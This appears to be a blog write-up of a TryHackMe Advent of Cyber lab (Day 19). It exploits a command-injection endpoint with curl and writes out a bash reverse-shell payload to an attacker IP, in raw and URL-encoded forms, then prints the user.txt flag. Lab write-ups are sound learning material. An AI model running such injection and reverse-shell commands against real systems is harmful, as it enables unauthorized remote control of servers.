---
title: "Advent of Cyber Day 19 Commands"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 19 Commands"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

Another day, another hack from the Christmas Monster. Can you get back control of the system?

Access the web server on [http://[your-ip]:3000/](http://[your-ip]:3000/)

McSkidy actually found something interesting on the /api/cmd endpoint.

Check out the supporting material [here](https://docs.google.com/document/d/1W65iKmUMtz-srteErhrGFJkWBXJ4Xk5PYlCZVMIZgs8/edit?usp=sharing).

### Setup

```bash
kali@kali:~$ curl http://10.10.79.41:3000/api/ls
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /api/ls</pre>
</body>
</html>

kali@kali:~$ curl http://10.10.79.41:3000/api/cmd/ls
{"stdout":"bin\nboot\ndata\ndev\netc\nhome\nlib\nlib64\nlocal\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n","stderr":""}
```

Let's get a reverse shell on the target

```bash
curl http://10.10.79.41:3000/api/cmd/bash -i >& /dev/tcp/10.9.45.74/9999 0>&1
```

But of course we need to url encode the payload

```bash
curl http://10.10.79.41:3000/api/cmd/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.45.74%2F9999%200%3E%261
```

[Reverse Shell Cheat Sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### #1 What are the contents of the user.txt file?

```bash
[root@ip-10-10-79-41 /] find / | grep -i "user.txt"

/usr/share/doc/fontconfig-2.10.95/fontconfig-user.txt
"/home/bestadmin/user.txt"
```

```bash
[root@ip-10-10-79-41 /] cat /home/bestadmin/user.txt
cat /home/bestadmin/user.txt
"5W7WkjxBWwhe3RNsWJ3Q"
```
